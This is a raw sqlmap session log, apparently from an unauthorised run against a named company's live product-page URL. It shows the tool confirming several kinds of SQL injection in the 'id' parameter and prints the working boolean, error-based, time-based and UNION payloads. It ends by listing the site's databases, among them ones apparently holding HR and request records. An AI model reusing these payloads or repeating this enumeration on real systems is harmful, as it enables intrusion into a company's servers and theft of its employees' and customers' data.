https://www.trijicon.com/na_en/products/product1.php?id=SRO
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.5.151#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:23:27 /2019-05-30/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[07:23:30] [INFO] testing connection to the target URL
[07:23:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:23:32] [INFO] testing if the target URL content is stable
[07:23:33] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[07:23:33] [INFO] testing if GET parameter 'id' is dynamic
[07:23:34] [INFO] GET parameter 'id' appears to be dynamic
[07:23:34] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[07:23:35] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[07:23:35] [INFO] testing for SQL injection on GET parameter 'id'
[07:23:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:23:36] [WARNING] reflective value(s) found and filtering out
[07:24:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[07:24:16] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
[07:24:20] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[07:24:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[07:24:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[07:24:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[07:24:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[07:24:21] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[07:24:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[07:24:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[07:24:22] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[07:24:22] [INFO] testing 'MySQL inline queries'
[07:24:22] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[07:24:22] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[07:24:22] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[07:24:23] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[07:24:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[07:24:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[07:24:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:24:34] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[07:24:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:24:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[07:24:41] [INFO] target URL appears to be UNION injectable with 1 columns
[07:24:41] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[07:24:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[?1049h[22;0;0t[1;24r(B[m[4l[?7h[H[2J[24;1H[?1049l[23;0;0t[?1l>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 162 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-9413' OR 3998=3998-- gLOG

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=SRO' AND (SELECT 1775 FROM(SELECT COUNT(*),CONCAT(0x716a6a7671,(SELECT (ELT(1775=1775,1))),0x7171787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RxlS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=SRO' AND (SELECT 2817 FROM (SELECT(SLEEP(5)))aigD)-- tGNn

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: id=SRO' UNION ALL SELECT CONCAT(0x716a6a7671,0x71505676496c6455704f5078757772596f564e685a7253554455754a664547494a73687758686b75,0x7171787171)-- IpCL
---
[07:24:42] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 5.5.38
back-end DBMS: MySQL >= 5.0
[07:24:42] [INFO] fetching database names
available databases [8]:
[*] information schema
[*] information_schema
[*] trijicon cms p6
[*] trijicon hr p
[*] trijicon requests p
[*] trijicon_cms_p6
[*] trijicon_hr_p
[*] trijicon_requests_p

[07:24:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.trijicon.com'

[*] ending @ 07:24:42 /2019-05-30/

